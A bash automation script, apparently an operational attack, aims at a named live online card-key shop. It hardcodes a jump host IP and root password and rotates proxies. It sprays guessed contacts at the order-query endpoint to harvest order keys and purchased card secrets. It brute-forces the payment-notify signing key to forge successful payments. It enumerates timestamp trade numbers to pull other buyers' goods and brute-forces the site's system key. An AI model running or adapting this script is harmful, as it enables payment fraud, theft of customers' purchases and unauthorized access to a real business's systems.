#!/bin/bash
# Fast path: query spray -> pay/notify -> getshop -> limited SYS_KEY
set -u
export PATH="/data/venvs/pentest/bin:/data/automation/bin:/usr/bin:$PATH"
OUT="/data/automation/results/xuxin66.top/deep6d_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"
LOG=/data/logs/xuxin66-deep6d.log
exec > >(tee "$LOG") 2>&1
echo "[$(date +%H:%M:%S)] OUT=$OUT"

JP=124.248.67.170; JP_PASS=UzHlZQDUy7XP
BASE=https://xuxin66.top/shop
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

qg(){ /data/automation/bin/qg-proxy-fetch.sh >/dev/null; sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no root@$JP "mkdir -p /data/config /data/tmp; cat > /data/config/proxy.env" < /data/config/proxy.env; }
jp(){ sshpass -p "$JP_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 root@$JP "$@"; }
scpjp(){ sshpass -p "$JP_PASS" scp -o StrictHostKeyChecking=no "$1" root@$JP:"$2"; }

qg

# contacts
python3 - <<'PY'
contacts=["123456","888888","666666","111111","000000","123123","5201314","datou111","datou333",
"xuxin66","xuxin","admin","test","qq","13800138000","18888888888","10000","10086","@xuxin66vip",
"xuxin079","password","abc123","qwer1234","woaini","666888","123456789","12345678","1314520",
"7758521","112233","abcdef","qwerty","asdasd","aa123456","qq123456","wx123456"]
try:
  for i,l in enumerate(open("/tmp/query_pwd_list.txt",errors="ignore")):
    if i>200: break
    v=l.strip()
    if 4<=len(v)<=32: contacts.append(v)
except: pass
for p in ["130","131","132","133","135","136","137","138","139","150","151","152","155","156","157","158","159","180","181","182","183","185","186","187","188","189"]:
  contacts += [p+"00000000", p+"11111111", p+"88888888", p+"12345678"]
seen=set(); out=[]
for c in contacts:
  if c not in seen: seen.add(c); out.append(c)
open("/data/tmp/xuxin66_d6d_contacts.txt","w").write("\n".join(out))
print("contacts",len(out))
PY
scpjp /data/tmp/xuxin66_d6d_contacts.txt /data/tmp/xuxin66_d6d_contacts.txt

echo "[$(date +%H:%M:%S)] [1] query spray"
jp bash -s <<EOF | tee "$OUT/query_spray.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6d_ck.txt
rm -f \$CK
curl -sk -x "\$PROXY_URL" -c \$CK -b \$CK --max-time 25 -A "\$UA" "\$BASE/" -o /tmp/d6d_home.html
echo HOME=\$(wc -c </tmp/d6d_home.html)
CSRF=\$(python3 -c "import re;h=open('/tmp/d6d_home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\\s*=\\s*\\\"([a-f0-9]+)\\\"',h);print(m.group(1) if m else '')")
# sanity
r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 8 -A "\$UA" -e "\$BASE/" -H "X-Requested-With: XMLHttpRequest" -X POST --data-urlencode "id=1" --data-urlencode "skey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" --data-urlencode "csrf_token=\$CSRF" "\$BASE/ajax.php?act=order")
echo SANITY=\$r
n=0
while IFS= read -r c; do
  [ -z "\$c" ] && continue
  enc=\$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "\$c")
  curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 8 -A "\$UA" "\$BASE/?mod=query&data=\$enc" -o /tmp/d6d_q.html
  if grep -q showOrder /tmp/d6d_q.html; then
    echo "HTMLHIT|\$c"
    grep -oE "showOrder\\([0-9]+[[:space:]]*,[[:space:]]*'[0-9a-fA-F]+'\\)" /tmp/d6d_q.html | head -30
  fi
  r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 6 -A "\$UA" -e "\$BASE/?mod=query" -H "X-Requested-With: XMLHttpRequest" -X POST \
    --data-urlencode "qq=\$c" --data-urlencode "type=0" --data-urlencode "page=1" --data-urlencode "csrf_token=\$CSRF" "\$BASE/ajax.php?act=query")
  if echo "\$r" | grep -q '"skey"'; then echo "AJAXHIT|\$c|\$r"; fi
  # also type=1 for 17-digit
  if [ \${#c} -eq 17 ] && echo "\$c" | grep -Eq '^[0-9]+\$'; then
    r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 6 -A "\$UA" -e "\$BASE/?mod=query" -H "X-Requested-With: XMLHttpRequest" -X POST \
      --data-urlencode "qq=\$c" --data-urlencode "type=1" --data-urlencode "page=1" --data-urlencode "csrf_token=\$CSRF" "\$BASE/ajax.php?act=query")
    if echo "\$r" | grep -q '"skey"'; then echo "AJAX1HIT|\$c|\$r"; fi
  fi
  n=\$((n+1))
  [ \$((n % 40)) -eq 0 ] && echo "PROG|\$n"
  sleep 0.08
done < /data/tmp/xuxin66_d6d_contacts.txt
echo "QUERY_DONE|\$n"
EOF

# fetch kami for hits
if grep -qE 'showOrder|AJAXHIT|HTMLHIT' "$OUT/query_spray.txt"; then
  echo "[$(date +%H:%M:%S)] [1b] kami fetch"
  grep -oE "showOrder\([0-9]+[[:space:]]*,[[:space:]]*'[0-9a-fA-F]+'\)" "$OUT/query_spray.txt" | sort -u | while read -r so; do
    oid=$(echo "$so" | grep -oE '[0-9]+' | head -1)
    sk=$(echo "$so" | grep -oE '[0-9a-fA-F]{32}')
    jp bash -s <<EOF | tee -a "$OUT/kami.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6d_ck.txt
r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 8 -A "\$UA" -e "\$BASE/?mod=query" -H "X-Requested-With: XMLHttpRequest" -X POST --data-urlencode "id=$oid" --data-urlencode "skey=$sk" "\$BASE/ajax.php?act=order")
echo "KAMI|$oid|$sk|\$r"
EOF
  done
  # also ajax hits json skey
  grep '^AJAXHIT\|^AJAX1HIT' "$OUT/query_spray.txt" | head -20 | tee "$OUT/ajax_hits.txt"
fi

echo "[$(date +%H:%M:%S)] [2] pay+notify"
qg
jp bash -s <<EOF | tee "$OUT/buy_meta.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6d_ck.txt
rm -f \$CK
curl -sk -x "\$PROXY_URL" -c \$CK -b \$CK --max-time 25 -A "\$UA" "\$BASE/" -o /tmp/d6d_home.html
curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 20 -A "\$UA" "\$BASE/?mod=buy&cid=15&tid=168" -o /tmp/d6d_buy.html
python3 - <<'PY'
import re
h=open('/tmp/d6d_buy.html',encoding='utf-8',errors='ignore').read()
c=re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"',h)
hs=re.search(r'var hashsalt=(.+?);',h)
open('/tmp/d6d_csrf.txt','w').write(c.group(1) if c else '')
open('/tmp/d6d_hs.txt','w').write(hs.group(1) if hs else '')
print('csrf_ok',bool(c),'hs_len',len(open('/tmp/d6d_hs.txt').read()))
PY
EOF
expr=$(jp "cat /tmp/d6d_hs.txt")
hs=$(node -e "console.log($expr)" 2>/dev/null || true)
csrf=$(jp "cat /tmp/d6d_csrf.txt" | tr -d '\r\n')
inputv="kami$(date +%H%M%S)"
echo "hs=${hs:0:32} csrf=${csrf:0:16} input=$inputv"
pay=$(jp bash -s <<EOF
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6d_ck.txt
curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 15 -A "\$UA" -e "\$BASE/?mod=buy&cid=15&tid=168" -H "X-Requested-With: XMLHttpRequest" -X POST \
 --data-urlencode "tid=168" --data-urlencode "inputvalue=$inputv" --data-urlencode "num=1" \
 --data-urlencode "hashsalt=$hs" --data-urlencode "csrf_token=$csrf" "\$BASE/ajax.php?act=pay"
echo
EOF
)
echo "$pay" | tee "$OUT/pay.json"
TRADE=$(python3 -c "import json,sys;print(json.loads(sys.argv[1]).get('trade_no',''))" "$pay" 2>/dev/null || true)
echo TRADE=$TRADE

if [ -n "$TRADE" ]; then
  sub=$(jp bash -s <<EOF
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6d_ck.txt
curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 15 -A "\$UA" "\$BASE/other/submit.php?type=alipay&orderid=$TRADE" -o /tmp/d6d_sub.html
grep -oE 'https?://[^\"'\\'' <>]+' /tmp/d6d_sub.html | head -3
EOF
)
  echo "$sub" | tee "$OUT/submit.txt"
  MONEY=$(echo "$sub" | grep -oE 'money=[0-9.]+' | head -1 | cut -d= -f2); MONEY=${MONEY:-9}
  PID=$(echo "$sub" | grep -oE 'pid=[0-9]+' | head -1 | cut -d= -f2); PID=${PID:-1003}
  # notify keys
  python3 /data/automation/bin/xuxin66_build_keys.py >/dev/null
  head -2500 /data/tmp/xuxin66_syskeys_prio.txt > /data/tmp/xuxin66_d6d_nkeys.txt
  scpjp /data/tmp/xuxin66_d6d_nkeys.txt /data/tmp/xuxin66_d6d_nkeys.txt
  for start in 1 501 1001 1501 2001; do
    end=$((start+499))
    qg
    echo "[$(date +%H:%M:%S)] notify $start-$end"
    jp bash -s <<EOF | tee -a "$OUT/notify.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6d_ck.txt
TRADE='$TRADE'; MONEY='$MONEY'; PID='$PID'
sed -n '${start},${end}p' /data/tmp/xuxin66_d6d_nkeys.txt > /tmp/nk.txt
export PROXY_URL CK BASE UA TRADE MONEY PID
try(){ key="\$1"
sign=\$(MONEY="\$MONEY" TRADE="\$TRADE" PID="\$PID" KEY="\$key" python3 -c 'import hashlib,os;p={"pid":os.environ["PID"],"type":"alipay","out_trade_no":os.environ["TRADE"],"notify_url":"https://xuxin66.top/shop/other/epay_notify.php","return_url":"https://xuxin66.top/shop/other/epay_return.php","name":"test","money":os.environ["MONEY"],"trade_no":os.environ["TRADE"],"trade_status":"TRADE_SUCCESS"};items=sorted(k for k in p if p[k]!="");s="&".join(f"{k}={p[k]}" for k in items)+os.environ["KEY"];print(hashlib.md5(s.encode()).hexdigest())')
r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 5 -A "\$UA" -X POST \
 --data-urlencode "pid=\$PID" --data-urlencode "type=alipay" --data-urlencode "out_trade_no=\$TRADE" \
 --data-urlencode "trade_no=\$TRADE" --data-urlencode "notify_url=https://xuxin66.top/shop/other/epay_notify.php" \
 --data-urlencode "return_url=https://xuxin66.top/shop/other/epay_return.php" --data-urlencode "name=test" \
 --data-urlencode "money=\$MONEY" --data-urlencode "trade_status=TRADE_SUCCESS" --data-urlencode "sign=\$sign" \
 --data-urlencode "sign_type=MD5" "\$BASE/other/epay_notify.php")
if [ -n "\$r" ] && [ "\$r" != "error" ] && [ "\$r" != "fail" ] && [ "\$r" != "FAIL" ]; then echo "NOTIFYHIT|\$key|\$r"; fi
}
export -f try
cat /tmp/nk.txt | xargs -P 4 -I{} bash -c 'try "$@"' _ {}
echo NBATCH|$start
EOF
    grep -q NOTIFYHIT "$OUT/notify.txt" && break
  done
  jp bash -s <<EOF | tee "$OUT/post_check.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6d_ck.txt
echo GS=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 8 -A "\$UA" "\$BASE/other/getshop.php?trade_no=$TRADE")
enc=\$(python3 -c "import urllib.parse;print(urllib.parse.quote('$inputv'))")
curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 10 -A "\$UA" "\$BASE/?mod=query&data=\$enc" -o /tmp/d6d_q2.html
grep -q showOrder /tmp/d6d_q2.html && echo PAIDQUERY && grep -oE "showOrder\\([^)]+\\)" /tmp/d6d_q2.html | head
EOF
fi

echo "[$(date +%H:%M:%S)] [3] getshop dense"
python3 - <<'PY'
from datetime import datetime,timedelta
now=datetime.now(); cands=[]
for off in range(0,3*3600,2):
  t=now-timedelta(seconds=off)
  for suf in range(100,1000,11): cands.append(t.strftime("%Y%m%d%H%M%S")+f"{suf:03d}")
base=datetime(2026,8,3,6,44,0)
for off in range(-180,181):
  t=base+timedelta(seconds=off)
  for suf in range(100,1000,17): cands.append(t.strftime("%Y%m%d%H%M%S")+f"{suf:03d}")
seen=set(); out=[]
for c in cands:
  if c not in seen: seen.add(c); out.append(c)
open("/data/tmp/xuxin66_d6d_tn.txt","w").write("\n".join(out[:4500]))
print(len(out[:4500]))
PY
scpjp /data/tmp/xuxin66_d6d_tn.txt /data/tmp/xuxin66_d6d_tn.txt
for start in 1 901 1801 2701 3601; do
  end=$((start+899))
  qg
  echo "[$(date +%H:%M:%S)] getshop $start-$end"
  jp bash -s <<EOF | tee -a "$OUT/getshop.txt"
source /data/config/proxy.env
UA='$UA'; BASE='$BASE'; CK=/tmp/xuxin66_d6d_ck.txt
curl -sk -x "\$PROXY_URL" -c \$CK -b \$CK --max-time 15 -A "\$UA" "\$BASE/" -o /dev/null
sed -n '${start},${end}p' /data/tmp/xuxin66_d6d_tn.txt > /tmp/tnb.txt
export PROXY_URL CK BASE UA
try(){ tn="\$1"; r=\$(curl -sk -x "\$PROXY_URL" -b \$CK -c \$CK --max-time 3 -A "\$UA" "\$BASE/other/getshop.php?trade_no=\$tn" 2>/dev/null)
if [ -n "\$r" ] && ! echo "\$r" | grep -q '未付款'; then
  if echo "\$r" | grep -Eq '"code":0|卡密|kminfo'; then echo "GSHIT|\$tn|\$r"
  elif ! echo "\$r" | grep -q '订单不存在' && ! echo "\$r" | grep -q '"code":-1'; then echo "GSOTHER|\$tn|\$r"; fi
fi; }
export -f try
cat /tmp/tnb.txt | xargs -P 5 -I{} bash -c 'try "$@"' _ {}
echo GSBATCH|$start
EOF
  grep -q GSHIT "$OUT/getshop.txt" && break
done

echo "[$(date +%H:%M:%S)] [4] SYS_KEY limited"
python3 /data/automation/bin/xuxin66_build_keys.py >/dev/null
# extend with big head
python3 - <<'PY'
keys=open("/data/tmp/xuxin66_syskeys_prio.txt").read().splitlines()
big="/data/automation/results/youhui1998.top/deep_20260801_015500/syskey_big.txt"
if __import__("os").path.isfile(big):
  seen=set(keys)
  with open(big,errors="ignore") as f:
    for i,l in enumerate(f):
      if i>=8000: break
      k=l.strip()
      if 1<=len(k)<=64 and k not in seen:
        keys.append(k); seen.add(k)
open("/data/tmp/xuxin66_d6d_syskeys.txt","w").write("\n".join(keys))
print(len(keys))
PY
scpjp /data/tmp/xuxin66_d6d_syskeys.txt /data/tmp/xuxin66_d6d_syskeys.txt
scpjp /data/automation/bin/xuxin66_syskey_fast.sh /data/tmp/xuxin66_syskey_fast.sh
jp "chmod +x /data/tmp/xuxin66_syskey_fast.sh"
# split into batches of 500 with P=4 via sed - reuse d6c oracle if present else fast
for start in $(seq 1 500 6000); do
  qg
  end=$((start+499))
  echo "[$(date +%H:%M:%S)] syskey batch $start-$end"
  # create temp keyfile slice on JP
  out=$(jp bash -s <<EOF
source /data/config/proxy.env
sed -n '${start},${end}p' /data/tmp/xuxin66_d6d_syskeys.txt > /tmp/skslice.txt
bash /data/tmp/xuxin66_syskey_fast.sh 11240 /tmp/skslice.txt 4
EOF
)
  echo "$out" | tee -a "$OUT/syskey.txt" | tail -3
  if echo "$out" | grep -q '^HIT|'; then
    echo "$out" | grep '^HIT|' | head -1 | cut -d'|' -f3 > "$OUT/SYS_KEY.txt"
    break
  fi
  if echo "$out" | grep -q 'CSRF=$'; then
    echo proxy issue; continue
  fi
done

python3 - <<PY
import os,json,re
out="$OUT"
f={"syskey":None,"query":[],"kami":[],"notify":[],"getshop":[]}
if os.path.isfile(f"{out}/SYS_KEY.txt"):
  f["syskey"]=open(f"{out}/SYS_KEY.txt").read().strip()
for fn,key,pref in [("query_spray.txt","query",("HTMLHIT","AJAXHIT","AJAX1HIT","showOrder")),
 ("kami.txt","kami",("KAMI",)),("notify.txt","notify",("NOTIFYHIT",)),("getshop.txt","getshop",("GSHIT","GSOTHER")),
 ("syskey.txt","syskey_lines",("HIT",))]:
  p=os.path.join(out,fn)
  if not os.path.isfile(p): continue
  for ln in open(p,encoding="utf-8",errors="ignore"):
    if any(ln.startswith(x) or x in ln[:20] for x in pref):
      f.setdefault(key if key!='syskey_lines' else 'syskey_hit',[]).append(ln.strip()[:2000])
json.dump(f,open(f"{out}/FINDINGS.json","w"),ensure_ascii=False,indent=2)
md=f"""# xuxin66 订单/卡密 deep6d

- OUT: {out}
- SYS_KEY: `{f.get('syskey')}`
- query hits: {len(f.get('query',[]))}
- kami: {len(f.get('kami',[]))}
- notify: {len(f.get('notify',[]))}
- getshop: {len(f.get('getshop',[]))}
"""
open(f"{out}/SUMMARY.md","w").write(md)
print(md)
PY
echo "===== DONE ===== OUT=$OUT"
